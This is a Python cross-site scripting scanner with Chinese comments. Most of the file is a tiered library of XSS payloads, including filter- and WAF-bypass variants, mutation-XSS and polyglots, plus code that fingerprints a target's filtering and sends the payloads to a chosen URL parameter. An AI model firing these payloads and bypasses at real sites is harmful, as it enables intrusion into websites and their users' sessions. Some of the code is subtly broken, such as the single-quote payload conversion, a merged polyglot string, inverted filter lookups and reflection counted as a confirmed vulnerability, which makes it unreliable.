"""
XSS Scanner - 跨站脚本漏洞智能扫描工具
=====================================

核心设计: 不做无脑全量遍历, 采用"先探测后精准打击"策略
  1. 上下文感知 (Context-Aware): 分析注入点在HTML中的位置, 只用匹配该上下文的payload
  2. 过滤器指纹: 先发探针判断WAF/后端过滤了什么字符和关键词, 动态裁剪payload
  3. 优先级分级: 在野高频payload优先, 已知绕过变种次之, 罕见payload按需

支持的XSS类型:
  - Reflected XSS (反射型)
  - Context-Aware 注入 (标签内/属性内/script内/URL内)
  - Event Handler 注入 (onerror, onload, onfocus等)
  - SVG/IMG/IFrame 注入
  - Polyglot 跨上下文注入
  - DOM XSS (Mutation XSS / Dangling Markup)

用法:
  python xss_scanner.py -u "http://target/page?q=test"
  python xss_scanner.py -u "http://target/page" -p "q" -m POST -d "q=test"
  python xss_scanner.py -u "http://target/page?q=test" --fuzz-all    # 跳过智能筛选, 全量遍历

仅用于授权安全测试, 未经授权使用属违法行为。
"""

import argparse
import hashlib
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

import requests
from requests.exceptions import RequestException

# ──────────────────────────────────────────────
# 颜色输出
# ──────────────────────────────────────────────
class C:
    RED = "\033[91m"
    GRN = "\033[92m"
    YLW = "\033[93m"
    BLU = "\033[94m"
    CYN = "\033[96m"
    BLD = "\033[1m"
    DIM = "\033[2m"
    END = "\033[0m"

def info(msg):   print(f"{C.BLU}[*]{C.END} {msg}")
def ok(msg):    print(f"{C.GRN}[+]{C.END} {msg}")
def warn(msg):  print(f"{C.YLW}[!]{C.END} {msg}")
def fail(msg):  print(f"{C.RED}[-]{C.END} {msg}")
def head(msg):  print(f"\n{C.BLD}{'='*60}\n  {msg}\n{'='*60}{C.END}")
def dim(msg):   print(f"{C.DIM}    {msg}{C.END}")

# ──────────────────────────────────────────────
# Payload 库 — 按"上下文+触发方式"分类
# 来源: PortSwigger XSS Cheat Sheet 2026, XSStrike, 实战在野样本
# ──────────────────────────────────────────────

# --- 全局唯一标识 (用于确认反射, 不触发alert) ---
PROBE_MARKER = "xssprobe" + hashlib.md5(str(time.time()).encode()).hexdigest()[:6]

def build_probe():
    """构造探测字符串, 用于确认输入是否被反射"""
    raw = f"xsstest{PROBE_MARKER}"
    return raw, quote(raw, safe='')

# --- HTML上下文枚举 ---
CTX_BODY_TAG   = "body_tag"       # 直接在body中, 可注入标签
CTX_ATTR_QUOTED   = "attr_double_quote"  # 在双引号属性内
CTX_ATTR_SINGLE   = "attr_single_quote"  # 在单引号属性内
CTX_ATTR_UNQUOTED  = "attr_unquoted"      # 在无引号属性内
CTX_SCRIPT     = "script"        # 在<script>标签内
CTX_COMMENT     = "comment"       # 在HTML注释内
CTX_URL         = "url"          # 在href/src/action等URL属性内
CTX_STYLE       = "style"        # 在<style>标签内
CTX_UNKNOWN     = "unknown"      # 未知上下文

# --- 每个上下文下的 Payload 分级 ---
# 级别: 0 = 高频核心(必测), 1 = 绕过变种, 2 = 冷门/长payload

# ── 上下文: body_tag (可直接注入HTML标签) ──
PAYLOADS_BODY_TAG = {
    # --- 级别0: 高频核心, 几乎必测 ---
    0: [
        # 经典 script 标签
        '<script>alert(1)</script>',
        # img onerror — 在野最高频
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror=alert(document.cookie)>',
        # svg onload
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        # body onload
        '<body onload=alert(1)>',
        # iframe
        '<iframe src="javascript:alert(1)">',
        # a href javascript:
        '<a href="javascript:alert(1)">click</a>',
        # 无交互的事件 (animation, transition)
        '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        # input autofocus
        '<input autofocus onfocus=alert(1)>',
        # video/audio onerror
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        # select autofocus
        '<select autofocus onfocus=alert(1)>',
        '<textarea autofocus onfocus=alert(1)>',
        # math + xlink
        '<math><mtext><img src=x onerror=alert(1)>',
        # table 相关
        '<table background="javascript:alert(1)">',
        # object data
        '<object data="javascript:alert(1)">',
    ],
    # --- 级别1: 绕过变种, 常见过滤绕过 ---
    1: [
        # 大小写绕过
        '<ScRiPt>alert(1)</ScRiPt>',
        '<IMG SRC=x ONERROR=alert(1)>',
        '<SvG OnLoAd=alert(1)>',
        # 空字节绕过 (老版浏览器)
        '<scri\x00pt>alert(1)</scri\x00pt>',
        # 双写绕过
        '<scrscriptipt>alert(1)</scrscriptipt>',
        # 无空格
        '<img/src=x/onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        # 使用反引号代替括号 (老浏览器)
        '<img src=x onerror=alert`1`>',
        # 编码绕过
        '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
        '<img src=x onerror=alert(String.fromCharCode(49))>',
        # data URI
        '<object data="data:text/html,<script>alert(1)</script>">',
        # 换行绕过
        '<img\nsrc=x\nonerror=alert(1)>',
        '<svg\nonload=alert(1)>',
        # tab/回车绕过
        '<img\tsrc=x\tonerror=alert(1)>',
        # 注释分割
        '<img src=x on<!----error=alert(1)>',
        # 使用/替代空格
        '<img/src="x"/onerror="alert(1)">',
        # 多重编码
        '<img src=x onerror=a&#108;ert(1)>',
        # js 协议变种
        '<a href="&#106;avascript:alert(1)">click</a>',
        '<a href="jav\tascript:alert(1)">click</a>',
        '<a href="jav&#x09;ascript:alert(1)">click</a>',
        # 模板字符串
        '<script>alert`1`</script>',
        # 构造函数
        '<script>[].constructor.constructor("alert(1)")()</script>',
        # top/parent/self
        '<script>top["al"+"ert"](1)</script>',
        '<img src=x onerror=window["al"+"ert"](1)>',
        # atob/btoa
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        # setTimeout/setInterval
        '<script>setTimeout("ale"+\'rt(1)\',0)</script>',
        # location
        '<script>location="javascript:alert(1)"</script>',
        # 利用 HTML 实体
        '<img src="x" onerror="alert(1)">',
        '<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>',
        # template literal
        '<img src=x onerror=alert(1)//',
        # mutation XSS (mXSS)
        '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    ],
    # --- 级别2: Polyglot & 高级绕过 ---
    2: [
        # 经典 Polyglot (跨属性/标签上下文)
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//'
        '<svg/onload=alert(1)>\n',
        # 另一个 polyglot
        '" autofocus onfocus="alert(1) x="',
        # Dangling Markup (不需要执行JS)
        '"--></script><script>alert(1)</script><script>/*',
        # mutation XSS via noscript
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        # base64 data URI
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
        # CSS expression (仅IE)
        '<div style="background-image:expression(alert(1))">',
        # 利用 import 引入
        '<script type="module">import("data:text/javascript,alert(1)")</script>',
        # hidden=until-found 新属性
        '<div hidden=until-found onbeforematch=alert(1)>test</div>',
        # 利用 contenteditable
        '<div contenteditable onfocus=alert(1) autofocus>x</div>',
        # 利用 tabindex
        '<div tabindex=0 onfocus=alert(1) autofocus>x</div>',
        # 利用 accesskey
        '<a href="" accesskey="x" onclick="alert(1)">XSS</a>',
        # 滚动触发
        '<marquee onfinish=alert(1)>',
        '<marquee onbounce=alert(1)>',
        # 利用 CSS animation (无需交互)
        '<style>@keyframes x{from{left:0}to{left:1000px}}</style><div style="animation:x 1s" onanimationend=alert(1)>',
        # 利用伪协议无分号
        '<a href="javascript:alert(1)%00">click</a>',
        # 利用 window.name
        '<script>window.name="alert(1)";location="javascript:window.name"</script>',
        # 利用 postMessage
        '<iframe src="data:text/html,<script>parent.postMessage(&#39;xss&#39;,&#39;*&#39;)</script>">',
    ],
}

# ── 上下文: 属性内 (双引号) ──
PAYLOADS_ATTR_QUOTED = {
    0: [
        # 逃逸属性, 闭合标签
        '" onerror="alert(1)" x="',
        '" autofocus onfocus="alert(1)" x="',
        '" onmouseover="alert(1)" x="',
        '" onclick="alert(1)" x="',
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '"><svg onload=alert(1)>',
        '"><details open ontoggle=alert(1)>',
        # 纯属性逃逸 (不引入新标签)
        '" onfocus="alert(1)" autofocus="',
        '" onblur="alert(1)" autofocus="',
    ],
    1: [
        '" OnErRoR="alert(1)" x="',
        '" onerror="ale'+'rt(1)" x="',
        '" onerror="a&#108;ert(1)" x="',
        '" onload="alert(1)" x="',
        '" oninput="alert(1)" autofocus="',
        '" onmouseenter="alert(1)" x="',
        '"><img src=x onerror="alert(1)"',
        '"><svg/onload="alert(1)">',
        '" style="animation-name:x" onanimationstart="alert(1)" x="',
        # 利用事件冒泡
        '" onfocusin="alert(1)" autofocus="',
    ],
    2: [
        '" onbeforematch="alert(1)" hidden="until-found" x="',
        '" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto" x="',
        '"></style><script>alert(1)</script><style>',
        '"><!--</script><script>alert(1)</script>',
        '" onresize="alert(1)" style="display:block;width:100%;height:100%" x="',
    ],
}

# ── 上下文: 属性内 (单引号) ──
PAYLOADS_ATTR_SINGLE = {level: [
    p.replace('"', "'").replace('"', "'").replace('x="', "x='")
    for p in payloads
] for level, payloads in PAYLOADS_ATTR_QUOTED.items()}

# ── 上下文: 属性内 (无引号) ──
PAYLOADS_ATTR_UNQUOTED = {
    0: [
        ' onerror=alert(1) x=',
        ' autofocus onfocus=alert(1) x=',
        ' onclick=alert(1) x=',
        ' onmouseover=alert(1) x=',
        '><script>alert(1)</script>',
        '><img src=x onerror=alert(1)>',
        '><svg onload=alert(1)>',
    ],
    1: [
        ' OnErRoR=alert(1) x=',
        ' onload=alert(1) x=',
        ' onfocusin=alert(1) autofocus x=',
        ' oninput=alert(1) autofocus x=',
        ' onblur=alert(1) autofocus x=',
    ],
    2: [
        ' onbeforematch=alert(1) hidden=until-found x=',
        ' style=animation-name:x onanimationstart=alert(1) x=',
    ],
}

# ── 上下文: script 内 ──
PAYLOADS_SCRIPT = {
    0: [
        # 闭合 script
        '</script><script>alert(1)</script>',
        '</script><img src=x onerror=alert(1)>',
        '</script><svg onload=alert(1)>',
    ],
    1: [
        '</ScRiPt><img src=x onerror=alert(1)>',
        '</script /**/ ><img src=x onerror=alert(1)>',
        '\n</script><img src=x onerror=alert(1)>',
    ],
    2: [
        '</script><!--<script>alert(1)</script>',
        '\';alert(1);//',
        '";alert(1);//',
    ],
}

# ── 上下文: HTML 注释内 ──
PAYLOADS_COMMENT = {
    0: [
        '--><script>alert(1)</script>',
        '--><img src=x onerror=alert(1)>',
        '--><svg onload=alert(1)>',
    ],
    1: [
        '--!><script>alert(1)</script>',
        '--><!><script>alert(1)</script>',
        '-- --><script>alert(1)</script>',
    ],
    2: [],
}

# ── 上下文: URL 属性 (href/src/action) ──
PAYLOADS_URL = {
    0: [
        'javascript:alert(1)',
        'javascript:alert(document.cookie)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    ],
    1: [
        'javascript:alert(1)//',
        'javascript:void(0)//',
        'javascript&#58;alert(1)',
        'java\tscript:alert(1)',
        'java\nscript:alert(1)',
        '&#106;avascript:alert(1)',
        'jav&#x09;ascript:alert(1)',
    ],
    2: [
        'javascript:top["al"+"ert"](1)',
        'javascript:eval(atob("YWxlcnQoMSk="))',
    ],
}

# ── 上下文: style 内 ──
PAYLOADS_STYLE = {
    0: [
        '</style><script>alert(1)</script>',
        '</style><img src=x onerror=alert(1)>',
    ],
    1: [
        '</style><!--<script>alert(1)</script>',
        'expression(alert(1))',
        'background-image:url("javascript:alert(1)")',
    ],
    2: [
        '@import "javascript:alert(1)";',
    ],
}

# 上下文 → payload 映射
CONTEXT_PAYLOADS = {
    CTX_BODY_TAG:        PAYLOADS_BODY_TAG,
    CTX_ATTR_QUOTED:     PAYLOADS_ATTR_QUOTED,
    CTX_ATTR_SINGLE:     PAYLOADS_ATTR_SINGLE,
    CTX_ATTR_UNQUOTED:   PAYLOADS_ATTR_UNQUOTED,
    CTX_SCRIPT:          PAYLOADS_SCRIPT,
    CTX_COMMENT:         PAYLOADS_COMMENT,
    CTX_URL:             PAYLOADS_URL,
    CTX_STYLE:           PAYLOADS_STYLE,
}

# ──────────────────────────────────────────────
# 过滤器指纹探针 — 先发这些, 判断过滤策略
# ──────────────────────────────────────────────
FILTER_PROBES = {
    "<":       "angle_bracket",
    ">":       "angle_bracket_close",
    '"':       "double_quote",
    "'":       "single_quote",
    "(":       "parenthesis",
    ")":       "parenthesis_close",
    "/":       "slash",
    "`":       "backtick",
    "{":       "curly_brace",
    "}":       "curly_brace_close",
    "=":       "equals",
    ";":       "semicolon",
    "alert":   "keyword_alert",
    "script":  "keyword_script",
    "onerror": "keyword_onerror",
    "onload":  "keyword_onload",
    "javascript": "keyword_javascript",
    "eval":    "keyword_eval",
    "document": "keyword_document",
    "window":  "keyword_window",
    ".":       "dot",
    "+":       "plus",
    " ":       "space",
    "\n":      "newline",
    "\t":      "tab",
}

# ──────────────────────────────────────────────
# 上下文分析器 — 分析注入点在HTML中的位置
# ──────────────────────────────────────────────
class ContextAnalyzer:
    """分析反射点在HTML响应中的上下文"""

    @staticmethod
    def detect_context(html, marker):
        """
        在 HTML 中定位 marker, 判断其所在上下文

        Returns: (context_type, detail)
        """
        idx = html.find(marker)
        if idx == -1:
            return CTX_UNKNOWN, "marker not found in response"

        # 检查是否在注释内
        comment_start = html.rfind("<!--", 0, idx)
        comment_end = html.rfind("-->", 0, idx)
        if comment_start != -1 and (comment_end == -1 or comment_end < comment_start):
            return CTX_COMMENT, "inside HTML comment"

        # 检查是否在 <script> 内
        script_start = html.rfind("<script", 0, idx)
        script_end = html.rfind("</script", 0, idx)
        if script_start != -1 and (script_end == -1 or script_end < script_start):
            return CTX_SCRIPT, "inside <script> tag"

        # 检查是否在 <style> 内
        style_start = html.rfind("<style", 0, idx)
        style_end = html.rfind("</style", 0, idx)
        if style_start != -1 and (style_end == -1 or style_end < style_start):
            return CTX_STYLE, "inside <style> tag"

        # 检查是否在属性内 (向前搜索)
        before = html[:idx]
        attr_match = re.search(r'<\w+[^>]*\w+\s*=\s*$', before)
        if attr_match:
            # 找到属性起始位置
            attr_area = html[attr_match.start():idx]
            # 判断引号类型
            if attr_area.endswith('"'):
                return CTX_ATTR_QUOTED, "inside double-quoted attribute"
            elif attr_area.endswith("'"):
                return CTX_ATTR_SINGLE, "inside single-quoted attribute"
            else:
                return CTX_ATTR_UNQUOTED, "inside unquoted attribute"

        # 检查是否在 URL 属性中 (href/src/action/data)
        url_attr_match = re.search(r'<\w+[^>]*(?:href|src|action|data|formaction)\s*=\s*["\']?$', before)
        if url_attr_match:
            if before.endswith('"'):
                return CTX_URL, "inside URL attribute (double-quoted)"
            elif before.endswith("'"):
                return CTX_URL, "inside URL attribute (single-quoted)"
            else:
                return CTX_URL, "inside URL attribute (unquoted)"

        # 默认: body 标签内
        return CTX_BODY_TAG, "directly in HTML body"

# ──────────────────────────────────────────────
# 过滤器分析器 — 判断哪些字符/关键词被过滤
# ──────────────────────────────────────────────
class FilterAnalyzer:
    """发送探针, 分析服务端过滤策略"""

    def __init__(self, send_func):
        """
        Args:
            send_func: callable(payload) -> response_text
        """
        self.send = send_func
        self.filtered = set()     # 被完全移除的
        self.encoded = set()      # 被HTML实体编码的
        self.blocked = set()      # 被WAF拦截(响应异常)

    def analyze(self, max_level=1):
        """
        发送探针分析过滤策略, max_level: 探测深度
        """
        info("发送过滤器探针, 分析过滤策略...")
        results = {}

        # 组合探针: 每个字符/关键词单独测
        for probe_char, name in FILTER_PROBES.items():
            try:
                probe = f"xss{probe_char}test"
                resp_text = self.send(probe)

                if resp_text is None:
                    self.blocked.add(name)
                    continue

                if probe not in resp_text:
                    # 字符被移除
                    self.filtered.add(name)
                    dim(f"  移除: '{probe_char}' ({name})")
                elif probe_char in resp_text and probe_char not in probe:
                    # 特殊: 检查是否被编码
                    pass
                else:
                    results[name] = "pass"
            except Exception:
                self.blocked.add(name)

        # 编码检测: 发送特殊探针
        encoded_probe = f"<alert>test"
        resp = self.send(encoded_probe)
        if resp and "<alert>" not in resp and "&lt;alert&gt;" in resp:
            self.encoded.add("angle_bracket")
            dim("  检测到 HTML 实体编码")

        info(f"过滤分析完成: 移除={len(self.filtered)}, 编码={len(self.encoded)}, 拦截={len(self.blocked)}")
        return self

    def is_filtered(self, char):
        """检查字符是否被过滤"""
        for name, probe_char in FILTER_PROBES.items():
            if probe_char == char and name in self.filtered:
                return True
        return False

    def is_blocked(self, keyword):
        """检查关键词是否被WAF拦截"""
        for name, probe_char in FILTER_PROBES.items():
            if probe_char == keyword and name in self.blocked:
                return True
        return False

    def should_skip_payload(self, payload):
        """判断payload是否应该跳过"""
        # 检查是否包含被过滤的字符
        for name in self.filtered:
            for _, probe_char in FILTER_PROBES.items():
                if _ == name and probe_char in payload:
                    return True
        return False


# ──────────────────────────────────────────────
# 主扫描器
# ──────────────────────────────────────────────
class XSSScanner:
    def __init__(self, url, param, method="GET", data=None, cookies=None,
                 headers=None, timeout=10, proxy=None, workers=5,
                 max_level=1, fuzz_all=False):
        self.url = url
        self.param = param
        self.method = method
        self.data = data or {}
        self.cookies = cookies
        self.headers = headers or {}
        self.timeout = timeout
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.workers = workers
        self.max_level = max_level
        self.fuzz_all = fuzz_all
        self.results = []

        self.sess = requests.Session()
        self.sess.headers.update(self.headers)
        if cookies:
            self.sess.cookies.update(cookies)

    def _send(self, payload):
        """发送带payload的请求, 返回响应文本"""
        try:
            if self.method.upper() == "GET":
                parsed = urlparse(self.url)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[self.param] = [payload]
                new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
                resp = self.sess.get(new_url, timeout=self.timeout, allow_redirects=False,
                                     proxies=self.proxy)
            else:
                d = dict(self.data)
                d[self.param] = payload
                resp = self.sess.post(self.url, data=d, timeout=self.timeout,
                                      allow_redirects=False, proxies=self.proxy)
            return resp.text
        except RequestException:
            return None

    def _send_probe(self, payload):
        """发送探测请求, 返回完整响应文本"""
        return self._send(payload)

    def _check_xss(self, payload):
        """
        发送payload, 判断是否触发了XSS
        策略: 反射完整payload即认为可能存在漏洞
        """
        try:
            resp = self._send(payload)
            if resp is None:
                return None, "请求失败"

            # 核心判断: payload原样反射
            if payload in resp:
                # 进一步确认: 检查是否被安全编码
                # 如果 < 变成了 &lt; 则实际上不可执行
                html_escaped = ("&lt;" in resp and "&lt;" + payload[1:] not in resp)
                if html_escaped:
                    return False, "被HTML实体编码"

                return True, "payload完整反射"
            return False, "payload未反射"
        except Exception as e:
            return None, str(e)

    def scan(self):
        """执行完整扫描流程"""
        head("XSS Scanner - 跨站脚本漏洞扫描")
        info(f"目标: {self.url}")
        info(f"测试参数: {self.param}")
        info(f"请求方法: {self.method}")
        info(f"扫描模式: {'全量遍历' if self.fuzz_all else '智能筛选 (L0-L{})'.format(self.max_level)}")
        print()

        # Step 1: 基线探测 — 确认参数可反射
        head("Step 1: 反射探测")
        raw_probe, encoded_probe = build_probe()
        info(f"发送探针: {raw_probe}")

        resp_text = self._send_probe(raw_probe)
        if resp_text is None:
            fail("无法连接目标")
            return self.results

        if raw_probe not in resp_text:
            fail("参数值未被反射到响应中, 此参数无反射型XSS风险")
            return self.results

        ok(f"探针反射成功! 确认参数可反射")
        info(f"响应长度: {len(resp_text)}")

        # Step 2: 上下文分析
        head("Step 2: 上下文分析")
        ctx, detail = ContextAnalyzer.detect_context(resp_text, raw_probe)
        ok(f"注入上下文: {ctx}")
        info(f"详细: {detail}")

        # Step 3: 过滤器分析 (智能模式)
        filter_analyzer = None
        if not self.fuzz_all:
            head("Step 3: 过滤器指纹")
            filter_analyzer = FilterAnalyzer(self._send_probe)
            filter_analyzer.analyze()
        else:
            head("Step 3: 跳过过滤器分析 (全量模式)")

        # Step 4: Payload 精准测试
        head("Step 4: Payload 测试")

        # 获取当前上下文的 payload
        payloads_map = CONTEXT_PAYLOADS.get(ctx, PAYLOADS_BODY_TAG)
        payloads_to_test = []

        for level in range(self.max_level + 1):
            if level in payloads_map:
                payloads_to_test.extend(payloads_map[level])

        # 如果全量模式, 加入所有级别
        if self.fuzz_all:
            payloads_to_test = []
            for level_payloads in payloads_map.values():
                payloads_to_test.extend(level_payloads)

        # 过滤器裁剪 (智能模式)
        if filter_analyzer and not self.fuzz_all:
            original_count = len(payloads_to_test)
            payloads_to_test = [p for p in payloads_to_test
                                if not filter_analyzer.should_skip_payload(p)]
            filtered_count = original_count - len(payloads_to_test)
            if filtered_count > 0:
                info(f"过滤器裁剪: 跳过 {filtered_count} 个含被过滤字符的payload")

        info(f"待测 payload 数量: {len(payloads_to_test)}")
        print()

        # 并发测试
        tested = 0
        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            futures = {executor.submit(self._check_xss, p): p for p in payloads_to_test}
            for future in as_completed(futures):
                payload = futures[future]
                tested += 1
                try:
                    is_vuln, reason = future.result()
                    if is_vuln:
                        ok(f"[VULN] {ctx} | {reason}")
                        ok(f"  Payload: {payload[:120]}{'...' if len(payload) > 120 else ''}")
                        self.results.append({
                            "param": self.param,
                            "context": ctx,
                            "payload": payload,
                            "reason": reason,
                        })
                    elif is_vuln is None:
                        dim(f"[{tested}/{len(payloads_to_test)}] 请求失败: {reason}")
                except Exception as e:
                    dim(f"[{tested}/{len(payloads_to_test)}] 异常: {e}")

                # 进度
                if tested % 10 == 0 and tested < len(payloads_to_test):
                    dim(f"进度: {tested}/{len(payloads_to_test)}")

        # Step 5: 汇总
        head("扫描结果汇总")
        if self.results:
            for idx, r in enumerate(self.results, 1):
                ok(f"[{idx}] 参数={r['param']} | 上下文={r['context']}")
                ok(f"     Payload: {r['payload'][:100]}")
                ok(f"     原因: {r['reason']}")
            warn(f"共发现 {len(self.results)} 个潜在XSS漏洞")
        else:
            warn("未发现XSS漏洞")
            if not self.fuzz_all and self.max_level < 2:
                info("提示: 可尝试 --max-level 2 或 --fuzz-all 进行更深入测试")
        print()

        return self.results


# ──────────────────────────────────────────────
# 主入口
# ──────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="XSS Scanner - 跨站脚本漏洞智能扫描工具",
        epilog="仅用于授权安全测试, 未经授权使用属违法行为。"
    )
    parser.add_argument("-u", "--url", required=True, help="目标URL")
    parser.add_argument("-p", "--param", help="测试参数名 (不指定则自动检测)")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("-d", "--data", help="POST数据")
    parser.add_argument("-c", "--cookies", help="Cookie字符串")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时 (默认10)")
    parser.add_argument("--proxy", help="代理地址")
    parser.add_argument("--workers", type=int, default=5, help="并发数 (默认5)")
    parser.add_argument("--max-level", type=int, default=1, choices=[0, 1, 2],
                        help="payload级别: 0=仅核心, 1=加绕过变种, 2=全部 (默认1)")
    parser.add_argument("--fuzz-all", action="store_true",
                        help="全量遍历所有payload (跳过智能筛选)")

    args = parser.parse_args()

    # 解析参数
    parsed = urlparse(args.url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if args.param:
        test_params = [args.param]
    elif params:
        test_params = list(params.keys())
        info(f"自动检测参数: {test_params}")
    else:
        fail("未找到可测试参数, 请用 -p 指定")
        sys.exit(1)

    # 解析 cookies
    cookies = None
    if args.cookies:
        cookies = dict(item.split("=", 1) for item in args.cookies.split(";") if "=" in item)

    # 解析 POST data
    data = None
    if args.data:
        data = dict(item.split("=", 1) for item in args.data.split("&") if "=" in item)

    all_results = []
    for param in test_params:
        scanner = XSSScanner(
            url=args.url, param=param, method=args.method,
            data=data, cookies=cookies, timeout=args.timeout,
            proxy=args.proxy, workers=args.workers,
            max_level=args.max_level, fuzz_all=args.fuzz_all,
        )
        results = scanner.scan()
        all_results.extend(results)

    # 最终汇总
    if len(test_params) > 1 and all_results:
        head("全部参数扫描汇总")
        for idx, r in enumerate(all_results, 1):
            ok(f"[{idx}] param={r['param']} ctx={r['context']} payload={r['payload'][:80]}")


if __name__ == "__main__":
    main()
